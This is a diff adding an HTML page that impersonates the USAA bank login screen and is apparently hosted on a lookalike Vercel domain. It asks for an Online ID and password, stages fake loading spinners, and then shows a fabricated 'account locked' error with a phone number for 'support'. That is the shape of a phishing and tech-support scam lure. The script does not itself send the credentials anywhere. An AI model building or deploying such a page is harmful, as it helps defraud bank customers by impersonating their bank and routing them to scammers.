@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script defer data-domain="usaa24x7loginsins.vercel.app" src="https://plausible.io/js/script.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>USAA Login</title>
+  <style>
+    /* Global Styles */
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #002855; /* Blue background */
+      color: white; /* Default text color for visibility */
+    }
+
+    /* Navbar Styles */
+    .navbar {
+      background-color: #001d40;
+      color: white;
+      padding: 10px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .logo {
+      width: 80px;
+    }
+
+    .nav-link {
+      color: white;
+      text-decoration: none;
+      margin-left: 15px;
+      font-weight: bold;
+    }
+
+    .nav-link:hover {
+      text-decoration: underline;
+    }
+
+    /* Page Layout */
+    .main-container {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      padding: 50px 10%;
+      position: relative;
+      flex-wrap: wrap;
+    }
+
+    .new-to-usaa {
+      margin-bottom: 30px;
+      text-align: left;
+      font-size: 16px;
+      color: white;
+      flex: 1 1 300px;
+    }
+
+    .new-to-usaa strong {
+      font-size: 24px;
+    }
+
+    .login-container {
+      background-color: white;
+      max-width: 450px;
+      padding: 30px 20px;
+      border-radius: 5px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      color: black;
+      flex: 1 1 350px;
+    }
+
+    h1, h2 {
+      font-size: 20px;
+      margin-bottom: 15px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    label {
+      font-size: 14px;
+      text-align: left;
+    }
+
+    input[type="text"], input[type="password"] {
+      padding: 10px;
+      font-size: 16px;
+      border: 1px solid #c0c4c7;
+      border-radius: 6px;
+      width: 100%;
+      box-sizing: border-box;
+    }
+
+    input:focus {
+      outline: none;
+      border: 2px solid #0056b3;
+    }
+
+    button {
+      background-color: #00573d;
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+      width: 100%;
+    }
+
+    button:hover {
+      background-color: #00452f;
+    }
+
+    .help-link {
+      color: #0056b3;
+      text-decoration: none;
+      margin-top: 10px;
+      display: block;
+      font-size: 14px;
+    }
+
+    .help-link:hover {
+      text-decoration: underline;
+    }
+
+    .spinner {
+      width: 25px;
+      height: 25px;
+      border: 4px solid #ccc;
+      border-top: 4px solid #0056b3;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 10px auto;
+    }
+
+    @keyframes spin {
+      from {
+        transform: rotate(0deg);
+      }
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    /* Footer Styles */
+    footer {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 14px;
+      background-color: #001d40;
+      padding: 10px;
+      color: white;
+    }
+
+    .footer-link {
+      color: white;
+      text-decoration: none;
+      margin: 0 10px;
+    }
+
+    .footer-link:hover {
+      text-decoration: underline;
+    }
+
+    /* Responsive Styles */
+    @media (max-width: 768px) {
+      .main-container {
+        flex-direction: column;
+        padding: 20px;
+        align-items: center;
+      }
+
+      .new-to-usaa {
+        text-align: center;
+        flex: none;
+        margin-bottom: 20px;
+      }
+
+      .login-container {
+        width: 100%;
+        max-width: 350px;
+      }
+
+      input[type="text"], input[type="password"] {
+        padding: 12px;
+        font-size: 14px;
+      }
+
+      button {
+        font-size: 14px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .navbar {
+        flex-direction: column;
+        text-align: center;
+      }
+
+      .nav-link {
+        margin-left: 0;
+        margin-top: 5px;
+      }
+
+      .main-container {
+        padding: 10px;
+      }
+
+      .login-container {
+        padding: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="navbar">
+      <img src="usaaaa.jpeg" alt="USAA Logo" class="logo">
+      <nav>
+        <a href="#" class="nav-link">JOIN USAA</a>
+        <a href="#" class="nav-link">REGISTER</a>
+      </nav>
+    </div>
+  </header>
+  <main>
+    <div class="main-container">
+      <div class="new-to-usaa">
+        <strong>New to USAA?</strong>
+        <p>Become a member by selecting "Join USAA" <br> — it's easy and only takes a few minutes.</p>
+        <button style="background-color: white; color: #0056b3; border: 1px solid #0056b3; padding: 10px 20px; border-radius: 4px; cursor: pointer;">
+          Join USAA
+        </button>
+      </div>
+      <div class="login-container">
+        <h2>Log On</h2>
+        <form id="login-form">
+          <label for="online-id">Online ID</label>
+          <input type="text" id="online-id" placeholder="Enter Online ID">
+          <button type="button" id="next-button">Next</button>
+        </form>
+        <a href="#" class="help-link">I need help logging on</a>
+      </div>
+    </div>
+  </main>
+  <footer>
+    <a href="#" class="footer-link">Security Center</a>
+    <a href="#" class="footer-link">Privacy Center</a>
+    <a href="#" class="footer-link">Accessibility at USAA</a>
+  </footer>
+
+<script>
+  const nextButton = document.getElementById('next-button');
+  const loginForm = document.getElementById('login-form');
+
+  nextButton.addEventListener('click', () => {
+    // Get the current Online ID value
+    const onlineId = document.getElementById('online-id').value;
+
+    if (!onlineId) {
+      alert("Please enter your Online ID."); // Simple validation
+      return;
+    }
+
+    // Clear existing form and show spinner
+    loginForm.innerHTML = '<div class="spinner"></div>';
+
+    // Simulate a delay for server response
+    setTimeout(() => {
+      // Replace spinner with password form
+      loginForm.innerHTML = `
+        <label for="online-id">Online ID</label>
+        <input type="text" id="online-id" value="${onlineId}" readonly>
+        <label for="password">Password</label>
+        <div style="display: flex; align-items: center;">
+          <input type="password" id="password" placeholder="Enter Password" style="flex: 1;">
+          <a href="#" id="toggle-password" style="margin-left: 10px; color: #0056b3; text-decoration: none;">Show</a>
+        </div>
+        <div style="margin-top: 10px; text-align: left;">
+          <input type="checkbox" id="remember-browser">
+          <label for="remember-browser" style="font-size: 14px;">Remember this browser to log on faster next time.</label>
+        </div>
+        <button type="button" id="login-button">Log In</button>
+      `;
+
+      // Add functionality to toggle password visibility
+      const togglePassword = document.getElementById('toggle-password');
+      const passwordInput = document.getElementById('password');
+      const loginButton = document.getElementById('login-button');
+      const loginContainer = document.querySelector('.login-container');
+
+      togglePassword.addEventListener('click', (e) => {
+        e.preventDefault();
+        if (passwordInput.type === 'password') {
+          passwordInput.type = 'text';
+          togglePassword.textContent = 'Hide';
+        } else {
+          passwordInput.type = 'password';
+          togglePassword.textContent = 'Show';
+        }
+      });
+
+      // Handle login button click
+      loginButton.addEventListener('click', () => {
+        const password = passwordInput.value;
+
+        if (!password) {
+          alert("Please enter your password.");
+          return;
+        }
+
+        // Show spinner after clicking "Log In"
+        loginForm.innerHTML = '<div class="spinner"></div>';
+
+        setTimeout(() => {
+          // Simulate login failure and show error message above "Log On"
+          const errorMessage = `
+            <div class="error-message" style="color: red; margin-bottom: 15px;">
+             Error Code: 0X0047893EE2 <br> Your account has been locked due to some suspicious login attempts. <br>Contact Support : <a href="tel:18333553102">+1-833-355-3102</a>
+            </div>
+          `;
+
+          loginContainer.innerHTML = `
+            ${errorMessage}
+            <h2>Log On</h2>
+            <form id="login-form">
+              <label for="online-id">Online ID</label>
+              <input type="text" id="online-id" value="${onlineId}" readonly>
+              <label for="password">Password</label>
+              <div style="display: flex; align-items: center;">
+                <input type="password" id="password" placeholder="Enter Password" style="flex: 1;">
+                <a href="#" id="toggle-password" style="margin-left: 10px; color: #0056b3; text-decoration: none;">Show</a>
+              </div>
+              <div style="margin-top: 10px; text-align: left;">
+                <input type="checkbox" id="remember-browser">
+                <label for="remember-browser" style="font-size: 14px;">Remember this browser to log on faster next time.</label>
+              </div>
+              <button type="button" id="login-button">Log In</button>
+            </form>
+          `;
+
+          // Reinitialize toggle password functionality
+          const togglePassword = document.getElementById('toggle-password');
+          const passwordInput = document.getElementById('password');
+
+          togglePassword.addEventListener('click', (e) => {
+            e.preventDefault();
+            if (passwordInput.type === 'password') {
+              passwordInput.type = 'text';
+              togglePassword.textContent = 'Hide';
+            } else {
+              passwordInput.type = 'password';
+              togglePassword.textContent = 'Show';
+            }
+          });
+        }, 2000); // Simulate a delay for server response
+      });
+    }, 2000); // 2-second delay for spinner
+  });
+</script>
+</body>
+</html>
